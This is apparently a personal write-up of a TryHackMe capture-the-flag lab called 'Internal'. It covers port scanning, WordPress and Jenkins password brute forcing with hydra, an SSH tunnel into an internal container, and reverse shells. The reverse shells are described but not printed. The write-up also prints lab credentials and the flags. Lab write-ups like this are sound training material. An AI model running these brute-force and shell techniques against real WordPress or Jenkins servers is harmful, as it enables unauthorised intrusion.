# Hack Log 17 - TryHackMe [Internal](https://tryhackme.com/room/internal)

üìÜ:**Date:** 2025-12-18 
üîç**Objective:** Obtain user and root flags.  
üéØ**Target**: TryHackme Internal (Lab CTF)  

---  
## Actions Taken

### Port Scan and Enumeration

```bash
# Nmap 7.95 scan initiated Thu Dec 18 13:05:19 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -T 4 -p- -oN scan_results 10.48.133.67
Nmap scan report for 10.48.133.67
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
* HTTP server is running on port 80.

### Directory Enumeration
```bash
$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.49.147.163/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.147.163/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 71ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 86ms]
blog                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 164ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 217ms]
phpmyadmin              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 154ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 76ms]
wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 123ms]
```

* There is a directory named as "wordpress" which says that there is a wordpress site running.
* Inspecting one of the webpages revealed that the underlying version was "Wordpress 5.4.2".

### Wordpress scan
```bash
[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
* Found a user named 'admin'.
* Bruteforcing the wordpress login
```bash
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                            
Trying admin / bratz1 Time: 00:02:34 <                                                        > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```
* Found the valid credentials.

### Initial Foothold (gaining the shell)
* Logged into the admin panel of the wordpress using the credentials.
* Edited the theme template with a php reverse shell.
* Succesfully gained the reverse shell as the user "www-data".

### First Flag
* Upon exploring the system, found a note with credentials for user "aubreanna".
```bash
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```
* Escalated to user aubreanna.
* Found the user.txt in "/home/aubreanna".
```bash
aubreanna@internal:~$ cat user.txt
cat user.txt
THM{int3rna1_fl4g_1
```

### Pivoting
* In user directory for aubreanna there was a file named jenkins.txt.
```bash
aubreanna@internal:~$ cat jenkins.txt
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```
* It seems there is a jenkins service running on a machine present in the internal network which we don't have access to.

* Forwarding the port.
```bash
ssh -L 9090:172.17.0.2:8080 aubreanna@10.49.147.163 -fN
```
* Accessing the forwarded port revealed a login page to Jenkins panel.
* Bruteforcing the password for user 'admin'.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 9090 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[9090][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
[STATUS] attack finished for 127.0.0.1 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
* Logged in using the credentials.
* In the Jenkins script console, pasted the groovy reverse shell.
* Started the listener on local machine and succedfully received the shell.

### Final flag (root access)
* Gained access as user "jenkins".
* Found a "note.txt" in /opt.
```bash
cat note.txt  
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you   
need access to the root user account.

root:tr0ub13guM!@#123
```
* Going back to the previous shell with user aubreanna, using the password for root user, gained the root shell.
```bash
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}
```
